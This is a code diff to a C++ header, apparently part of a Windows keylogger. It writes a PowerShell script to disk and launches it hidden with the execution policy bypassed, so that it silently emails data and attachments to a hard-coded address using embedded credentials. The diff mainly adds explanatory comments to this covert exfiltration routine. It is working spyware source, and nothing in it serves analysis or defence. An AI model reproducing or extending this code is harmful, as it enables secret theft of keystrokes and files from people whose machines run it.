@@ -1,10 +1,9 @@
-#pragma once
 #ifndef SENDMAIL_H
 #define SENDMAIL_H
 
 #include <fstream>
 #include <vector>
-#include "windows.h"
+#include <Windows.h>
 #include "IO.h"
 #include "Timer.h"
 #include "Helper.h"
@@ -13,9 +12,10 @@
 
 namespace Mail
 {
-	#define X_EM_TO "email@gmail.com"
-	#define X_EM_FROM "email@gmail.com"
-	#define X_EM_PASS "password"
+	// Both emails can be the same
+#define X_EM_TO "To email address"
+#define X_EM_FROM "From email address"
+#define X_EM_PASS "password"
 
 	const std::string &PowerShellScript =
 		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
@@ -53,18 +53,18 @@ namespace Mail
 		" -From \"" +
 		std::string(X_EM_FROM) +
 		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
-	
-	#undef X_EM_TO
-	#undef X_EM_FROM
-	#undef X_EN_PASS
 
-	std::string StringReplace(std::string s, const std::string &what, const std::string &with)
+#undef X_EM_FROM
+#undef X_EM_TO
+#undef X_EM_PASS
+
+	std::string StringReplace(std::string s, const std::string &what, const std::string &with) // search for a specific string and replace that string
 	{
 		if (what.empty())
-			return s;
+			return s; // nothing to replace
 		size_t sp = 0;
 
-		while ((sp = s.find(what, sp)) != std::string::npos)
+		while ((sp = s.find(what, sp)) != std::string::npos) // as long as not equal to null terminator position
 			s.replace(sp, what.length(), with), sp += with.length();
 		return s;
 	}
@@ -78,13 +78,12 @@ namespace Mail
 	bool CreateScript()
 	{
 		std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));
-
 		if (!script)
-			return false;
+			return false; // check if script was created
 		script << PowerShellScript;
 
 		if (!script)
-			return false;
+			return false; // was it successfully written
 
 		script.close();
 
@@ -92,72 +91,70 @@ namespace Mail
 	}
 
 	Timer m_timer;
-	
-	int SendMail(const std::string &subject, const std::string &body, std::string &attachments)
+
+	int SendMail(const std::string &subject, const std::string &body, const std::string &attachments)
 	{
-		bool ok;
+		bool ok; // if mail was sucessfully sent
 
 		ok = IO::MKDir(IO::GetOurPath(true));
 		if (!ok)
 			return -1;
 		std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
 		if (!CheckFileExists(scr_path))
-			ok = CreateScript();
-		if (!ok)
+			ok = CreateScript(); // attempt to create script if not present
+		if (!ok) // was attempt successful
 			return -2;
 
-		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
-							+ StringReplace(subject, "\"", "\\\"") +
-							"\" -Body \""
-							+ StringReplace(body, "\"", "\\\"") +
-							"\" -Att \"" + attachments + "\"";
+		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \"" +
+			StringReplace(subject, "\"", "\\\"") + "\" -Body \"" +
+			StringReplace(body, "\"", "\\\"") + "\" -Att \"" + attachments + "\"";
 
 		SHELLEXECUTEINFO ShExecInfo = { 0 };
 		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
 		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
 		ShExecInfo.hwnd = NULL;
-		ShExecInfo.lpVerb = "open";
-		ShExecInfo.lpFile = "powershell";
+		ShExecInfo.lpVerb = "open"; // open the file
+		ShExecInfo.lpFile = "powershell"; // file to execute
 		ShExecInfo.lpParameters = param.c_str();
 		ShExecInfo.lpDirectory = NULL;
-		ShExecInfo.nShow = SW_HIDE;
+		ShExecInfo.nShow = SW_HIDE; // hide powershell window
 		ShExecInfo.hInstApp = NULL;
 
 		ok = (bool)ShellExecuteEx(&ShExecInfo);
-		if (!ok)
+		if (!ok) // check if was executed successfully
 			return -3;
+		// Wait for 7 seconds to see if mail was successfully sent
 		WaitForSingleObject(ShExecInfo.hProcess, 7000);
-		DWORD exit_code = 100;
-		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
+		DWORD exit_code = 100; // arbitrary code to exit
+		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code); // check powershell status
 
-		m_timer.SetFunction([&]()
+		m_timer.SetFunction([&]() // lambda function to access all variables from SendMail
 		{
-			WaitForSingleObject(ShExecInfo.hProcess, 60000);
+			WaitForSingleObject(ShExecInfo.hProcess, 60000); // wait for one minute
 			GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
-			if ((int)exit_code == STILL_ACTIVE)
+			if ((int)exit_code == STILL_ACTIVE) // check powershell status
 				TerminateProcess(ShExecInfo.hProcess, 100);
 			Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int)exit_code));
 		});
 
-		m_timer.RepeatCount(1L);
+		m_timer.RepeatCount(1L); // execute only once
 		m_timer.SetInterval(10L);
-		m_timer.Start(true);
+		m_timer.Start(true); // asynchronous execute
 		return (int)exit_code;
 	}
 
-	int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att)
+	int SendMail(const std::string &subject, const std::string &body, const std::vector<std::string> &att) // overload SendMail to send multiple attachments
 	{
 		std::string attachments = "";
-		if (att.size() == 1U)
-			attachments = att.at(0);
+		if (att.size() == 1U) // check if only 1 attachment
+			attachments = att.at(0); // grab the first index only then
 		else
 		{
 			for (const auto &v : att)
-				attachments += v + "::";
+				attachments += v + "::"; // separate attachments with colons
 			attachments = attachments.substr(0, attachments.length() - 2);
 		}
 		return SendMail(subject, body, attachments);
 	}
 }
-
-#endif
+#endif // SENDMAIL_H
